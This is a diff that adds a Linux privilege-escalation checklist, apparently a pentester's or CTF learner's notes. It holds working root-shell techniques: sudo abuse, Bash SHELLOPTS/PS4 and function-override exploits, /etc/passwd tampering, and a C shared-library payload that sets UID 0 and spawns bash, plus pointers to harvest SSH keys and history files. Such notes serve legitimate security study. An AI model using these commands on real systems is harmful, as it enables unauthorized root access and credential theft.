@@ -1,0 +1,81 @@
+1- Run multiple priv esc scripts like Linpeas, Lse.sh, LinEnum, unix-privesc-check.
+
+2- Pay attention to output results and keep notes of most highlighted things. Also, run lse.sh with increasing levels as well.
+
+3- Go for low hanging fruits first this inlcudes but not limited to:
+  a- Sudo misconfiguration
+     - If you have user's password, then wecan run various commands to get root shell
+       - sudo su
+       - sudo -s 
+       - sudo -i
+       - sudo /bin/bash
+       - sudo passwd
+     - Check for commands we can run with "sudo -l" and search on gtfo bins if we can abuse them to get a root shell.
+     - if "env_keep" equals "LD_preload" and "LD_LIBRARY PATH" (this can be seen in sudo -l)then we can abuse it to gain root shell.
+     - Abusing intended functionalities like "sudo apache2 -f /etc/shadow" will show the first line of shadow file.
+  b- Exploits for lower version of bash
+     - if Bash < 4.2-048 we can use bash functions to spawn a root shell. this version of bash allows to add functions with forward slashes in their names. This function then take precedence over any 
+       executeable path:
+       steps:
+       function /usr/sbin/service { /bin/bash -p; }
+       export -f /usr/sbin/service 
+     - In bash version < 4.4 this exploit is valid.
+       commands:
+       
+       env -i SHELLOPTS=xtrace PS4='<test>' /usr/local/bin/suid-env2 - if the command is prepended by <test> then, our exploit is working and we can replace the test with command.
+       env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
+  c- Service running with root priveleges and their version enumeration to search for public exploits. To get the version we can do --version/-v flag or use below commands as well:
+     dpkg -l | grep <program>
+     rpm -qa | grep <program>
+  d- Weak File permissions in /etc/shadow and /etc/passwd.
+     - See world permissions for /etc/shadow, if we can read/write password hashes then we can either crack them or add our own password hash against root user.
+     - if we can write to /etc/passwd file then 2nd field of passwd file i.e. password hash, takes precedence from the password hash in shadow file.
+     - we can just add an other user with root priveleges in /etc/passwd
+     - we can also, remove "x" field in /etc/passwd file which tells linux system to take password from shadow file
+  e- Cron Jobs
+     - if we can edit cron jobs in /etc/crontab.
+     - if we can edit in PATH environment variable in /etc/crontab.
+     - abuse command line options if command is set with wild card ( highly unlikely)
+  f- SUID/SGID binaries:
+     - Search for vulnerabilities in binaries via searchsploit, google, github.
+     - Look for any shared object used by binaries:
+	     strace /path/to/binary 2>&1 | grep -iE "open|access|no such files"
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject(){
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+   
+     - If we can write to PATH of a system then we can get root shell by multiple enumeration steps.
+
+     - We can use various commands to enumerate binaries:
+      - strings /path/to/file - to search for certain strings in the file.
+      - strace -v -f -e execve <command> 2>&1 | grep exec - to grep for exec command when a certain binary runs
+      - ltrace <command>
+      
+    g- Passwords and Keys: 
+      - history files: cat *history | less
+      - config files
+      - ssh keys 
+      
+     
+   4- If nothing comes up, from above techniques then try looking for services running on ports which were not publically accessible. And check if we can forward them to our host.
+   
+   5- Enumerate binaries more to enusre to make sure you have done complete job to enumerate all binaries.
+   
+   6- At this point, we can try using kernel exploits as well.
+      - Make sure the kernel exploit you use is valid for your target linux distribution
+      - use linux exploit suggestor for that, and use one with highest ratings only
+      
+   7- If still nothing makes sense, try having a break and revisiting the notes.
+   
+   
+   
